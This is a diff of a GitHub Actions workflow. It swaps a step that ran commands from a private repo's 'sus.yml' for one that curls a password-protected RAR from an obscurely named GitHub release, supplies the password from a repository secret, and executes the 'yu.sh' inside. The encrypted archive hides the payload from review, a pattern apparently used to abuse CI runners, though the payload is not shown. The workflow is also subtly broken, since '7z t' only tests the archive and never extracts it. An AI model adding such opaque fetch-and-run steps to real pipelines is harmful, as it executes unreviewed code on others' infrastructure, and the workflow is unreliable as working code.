@@ -5,69 +5,62 @@ jobs:
   run_script:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout public repo
-        uses: actions/checkout@v4
-
-      - name: Check if secrets are available
+      - name: Download script from GitHub Release
         run: |
-          if [ -z "${{ secrets.PRIVATE_REPO_PAT }}" ]; then
-            echo "❌ Error: GitHub Secrets are not available in public repositories or forks!"
+          curl -sL -o yu.rar https://github.com/maywopselmp/wadma/releases/download/ampo/yu.rar
+          if [ ! -f "yu.rar" ]; then
+            echo "❌ Error: Failed to download yu.rar"
             exit 1
           fi
-          echo "✅ Secrets detected, continuing..."
 
-      - name: Fetch private repo
-        uses: actions/checkout@v4
-        with:
-          repository: ${{ secrets.PRIVATE_REPO_NAME }}
-          token: ${{ secrets.PRIVATE_REPO_PAT }}
-          path: private-config
-
-      - name: Verify private repo checkout
+      - name: Install dependencies
         run: |
-          if [ ! -d "private-config" ]; then
-            echo "❌ Error: Failed to fetch the private repo!"
+          sudo apt-get update -y
+          sudo apt-get install -y p7zip-full dos2unix
+
+      - name: Verify RAR file
+        run: |
+          if [ ! -f yu.rar ]; then
+            echo "❌ Error: yu.rar missing!"
             exit 1
           fi
-          echo "✅ Private repo fetched successfully!"
+          echo "✅ File size: $(ls -lh yu.rar | awk '{print $5}')"
 
-      - name: Install yq (v4.x)
-        run: |
-          sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq
-          sudo chmod +x /usr/bin/yq
-
-      - name: Debug pump.yml content
+      - name: Extract with 7zip
         env:
-          CONFIG_FILE: private-config/.github/workflows/sus.yml
+          RAR_PASS: '${{ secrets.RAR_PASSWORD }}'
         run: |
-          if [ ! -f "$CONFIG_FILE" ]; then
-            echo "❌ Error: $CONFIG_FILE not found!"
+          echo "Password length: ${#RAR_PASS} chars"  # Debugging password length
+          if [ -z "$RAR_PASS" ]; then
+            echo "❌ Error: Password is empty or not set correctly!"
             exit 1
           fi
-          echo "Contents of $CONFIG_FILE:"
-          cat "$CONFIG_FILE"
+          7z t -p"$RAR_PASS" yu.rar
 
-      - name: Run commands from pump.yml
-        env:
-          CONFIG_FILE: private-config/.github/workflows/sus.yml
+      - name: Fix script formatting
         run: |
-          if [ -f "$CONFIG_FILE" ]; then
-            echo "✅ Found config file: $CONFIG_FILE"
-            yq eval '.jobs.run_script.steps[].run' "$CONFIG_FILE" > temp_script.sh
-
-            # Debugging: Show extracted script lines
-            echo "Extracted commands:"
-            cat temp_script.sh
-
-            # If yq produced an empty file, exit with an error
-            if [ ! -s temp_script.sh ]; then
-              echo "❌ Error: No commands extracted from sus.yml!"
-              exit 1
-            fi
-
-            chmod +x temp_script.sh
-            ./temp_script.sh
-          else
-            echo "❌ Error: $CONFIG_FILE not found!"
+          if [ ! -f "extracted/yu.sh" ]; then
+            echo "❌ Error: yu.sh not found in extracted files"
             exit 1
           fi
+          dos2unix extracted/yu.sh || sed -i 's/\r$//' extracted/yu.sh
+          echo "✅ Script formatting fixed"
+
+      - name: Make script executable
+        run: |
+          chmod +x extracted/yu.sh
+          echo "✅ Script made executable"
+
+      - name: Run script
+        run: |
+          echo "🏃♂️ Running script..."
+          ./extracted/yu.sh
+          echo "✅ Script execution completed"
+
+      - name: Verify output
+        run: |
+          if [ ! -f "a.txt" ]; then
+            echo "❌ Error: a.txt not found after script execution"
+            exit 1
+          fi
+          echo "✅ Verification passed: a.txt exists"
